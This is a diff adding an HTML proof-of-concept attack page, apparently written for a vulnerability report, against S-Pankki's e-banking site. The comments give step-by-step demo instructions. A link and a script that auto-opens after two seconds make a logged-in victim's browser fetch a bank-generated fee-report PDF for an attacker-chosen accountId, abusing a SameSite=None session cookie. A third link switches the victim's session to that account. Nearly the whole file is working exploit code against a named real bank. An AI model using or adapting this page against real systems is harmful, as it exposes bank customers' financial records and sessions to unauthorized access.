@@ -1,0 +1,50 @@
+<!doctype html>
+<!--
+  S-Pankki e-banking — cross-site PDF steal via accountId + SameSite=None JSESSIONID
+
+  How to demo:
+   1. Log in to https://online.s-pankki.fi (demo user) in the same browser.
+   2. Get the accountId from any account page URL (it is in the URL of every
+      account-related page — the natural leak vector: history/bookmarks/Referer).
+   3. Put it in ACC_ID below, open this page from a DIFFERENT origin
+      (e.g. serve it via `python3 -m http.server` and open http://localhost:8000/...).
+   4. Click the link. Because JSESSIONID is SameSite=None, the top-level
+      navigation to online.s-pankki.fi carries the victim session cookie, and
+      the tokenless GET makes the server generate + serve the PDF for the
+      accountId in the URL. The bank's own UI does exactly this navigation
+      (getReportScript.js: new window, plain GET, no token).
+-->
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>attacker origin — accountId IDOR cross-site PDF steal</title>
+</head>
+<body>
+<h2>Attacker page (different origin)</h2>
+<p>Logged-in victim visits this page → the bank's report endpoint fires with the
+victim's <code>JSESSIONID</code> (<code>SameSite=None</code>) and the
+<code>accountId</code> chosen by the attacker.</p>
+
+<!-- Option 1 (primary): top-level navigation. SameSite=None cookies are sent on
+     cross-site top-level GETs. Server responds with application/pdf → the victim's
+     browser opens/downloads the bank-generated PDF for ACC_ID. -->
+<a id="steal"
+   href="https://online.s-pankki.fi/ebank/pad/fees/getReport.ds?accountId=REPLACE_WITH_VICTIM_ACCOUNTID&year=2025"
+   >steal the PDF report</a>
+
+<!-- Option 2: auto-fire after 2s (top-level window.open, user-gesture-free once the
+     page has been interacted with; mirrors the bank's own getReportScript.js). -->
+<script>
+var ACC_ID = "REPLACE_WITH_VICTIM_ACCOUNTID";
+var url = "https://online.s-pankki.fi/ebank/pad/fees/getReport.ds?accountId=" + ACC_ID + "&year=2025";
+document.getElementById("steal").href = url;
+setTimeout(function(){ window.open(url, "_blank"); }, 2000);
+</script>
+
+<!-- Option 3 (same primitive, data chain): context-switch the victim's session to the
+     attacker-chosen accountId, so subsequent in-session pages show that account.
+     (Bare/invalid accountId instead kills the session — see session-kill report.) -->
+<a href="https://online.s-pankki.fi/ebank/accountview/showAccountDetails.do?accountId=REPLACE_WITH_VICTIM_ACCOUNTID"
+   style="display:block;margin-top:2em">context-switch to accountId (secondary)</a>
+</body>
+</html>
